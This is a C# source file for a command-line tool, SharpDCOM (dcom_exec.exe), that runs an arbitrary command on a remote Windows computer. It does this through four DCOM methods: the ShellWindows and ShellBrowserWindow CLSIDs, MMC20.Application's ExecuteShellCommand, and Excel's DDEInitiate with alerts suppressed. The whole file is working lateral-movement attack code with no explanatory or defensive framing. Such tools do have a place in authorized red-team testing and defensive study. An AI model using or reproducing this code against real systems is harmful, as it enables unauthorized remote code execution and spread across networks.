using System;
using System.IO;
using System.Reflection;

namespace SharpDCOM
{

    public class Program
    {

        public static int Main(string[] args)
        {

            if (args.Length == 0) {
                // Print Usage
                Console.WriteLine(@"USAGE: dcom_exec.exe [-m method] [-s target] [-c command] [-a arguments] [-h]");
                Console.WriteLine("\nDONE");
                return 0;
            }

            string Method = "ShellWindows"; // -m <method>
            string ComputerName = null;     // -s <target>
            string Parameters = null;       // -a <arguments>
            string Command = null;          // -c <Binary> [Split]
            string CommandDir = null;       // -c <Binary Path> [Split]

            for (int i =0; i < args.Length; i++) {
                string arg = args[i];

                switch (arg.ToUpper()) {
                    case "-H": // Help
                        Console.WriteLine(@"USAGE: dcom_exec.exe [-m method] [-s target] [-c command] [-a arguments] [-h]");
                        Console.WriteLine("\nDONE");
                        return 0;

                    case "-M": // Method
                        i++;

                        if (i < args.Length) {
                            Method = args[i].ToUpper();
                        } else {
                            Console.WriteLine("[-] ERROR: No DCOM Method Specified");
                            Console.WriteLine("\nDONE");
                            return 1;
                        }

                        string[] Methods = {"SHELLWINDOWS", "MMC", "SHELLBROWSERWINDOW", "EXCELDDE"};

                        // Verify the Method is Valid
                        if (Array.IndexOf(Methods, Method) == -1) {
                            Console.WriteLine("[-] ERROR: Invalid Method '{0}'", Method);
                            Console.WriteLine("\nValid Methods:");
                            Console.WriteLine("\n\tShellWindows");
                            Console.WriteLine("\n\tMMC");
                            Console.WriteLine("\n\tShellBrowserWindow");
                            Console.WriteLine("\n\tExcelDDE");
                            Console.WriteLine("\nDONE");
                            return 1;
                        }
                        break;

                    case "-S": // System ComputerName
                        i++;

                        if (i < args.Length) {
                            ComputerName = args[i];
                        } else {
                            return 1;
                        }
                        break;
                    
                    case "-C": // Directory / BaseCommand
                        i++;
                        if (i < args.Length) {
                            Command = args[i];
                            FileInfo fi = new FileInfo(Command);
                            Command = fi.Name;
                            CommandDir = fi.DirectoryName;
                        } else {
                            return 1;
                        }
                        break;

                    case "-A": // Arguments
                        i++;

                        if (i < args.Length) {
                            Parameters = args[i];
                        } else {
                            return 1;
                        }
                        break;
                }

            }

            try
            {
				Console.WriteLine("[+] [DCOM Exec] Executing Command ({1}) via {0} Method.", Method, Command);
                if (Method == "SHELLWINDOWS")
                {
                    var CLSID = "9BA05972-F6A8-11CF-A442-00A0C90A8F39";
                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);
                    object RemoteComObject = NewMethod(ComType);
                    object Item = RemoteComObject.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { });
                    object Document = Item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, Item, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, CommandDir, null, 0 });
                }
                else if (Method == "MMC")
                {
                    Type ComType = Type.GetTypeFromProgID("MMC20.Application", ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object ActiveView = Document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, Document, null);
                    ActiveView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, ActiveView, new object[] { CommandDir + "\\" + Command , null , Parameters , 7 });
                }
                else if (Method == "SHELLBROWSERWINDOW")
                {
                    var CLSID = "C08AFD90-F2A1-11D1-8455-00A0C91F3880";
                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, CommandDir, null, 0 });
                }
                else if (Method == "EXCELDDE")
                {
                    Type ComType = Type.GetTypeFromProgID("Excel.Application", ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    RemoteComObject.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, RemoteComObject, new object[] { false });
                    RemoteComObject.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { CommandDir + "\\" + Command, Parameters });
                }
                else
                {
                    Console.WriteLine("You must supply arguments!");
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("DCOM Failed: " + e.Message);
            }

            Console.WriteLine("\nDONE");
            return 1;
        }

        private static object NewMethod(Type ComType)
        {
            return Activator.CreateInstance(ComType);
        }
        
    }

}